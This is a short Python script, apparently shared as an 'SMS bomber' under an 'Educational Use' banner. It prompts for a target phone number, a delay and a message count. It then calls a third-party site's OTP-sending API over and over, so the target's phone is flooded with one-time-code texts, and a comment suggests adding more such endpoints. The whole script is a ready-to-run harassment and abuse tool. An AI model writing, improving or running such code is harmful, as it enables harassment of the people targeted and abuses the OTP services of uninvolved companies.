import requests
import time
import os

def banner():
    os.system("clear")
    print("""
\033[1;32m

AF Cyber Force | Free SMS Bomber | Educational Use
\033[0m
""")

def send_sms(number):
    try:
        # Example: Open API / fake OTP endpoint (replace with more if available)
        url = f"https://www.utopiapromo.com/api/sendotp?phone={number}"
        response = requests.get(url)
        return response.status_code
    except:
        return "Error"

def main():
    banner()
    number = input("📲 Target number (e.g. +923001234567): ")
    delay = float(input("⏱ Delay (seconds): "))
    count = int(input("🔢 How many SMS: "))

    for i in range(count):
        result = send_sms(number)
        print(f"[{i+1}] Status: {result}")
        time.sleep(delay)

if __name__ == "__main__":
    main()
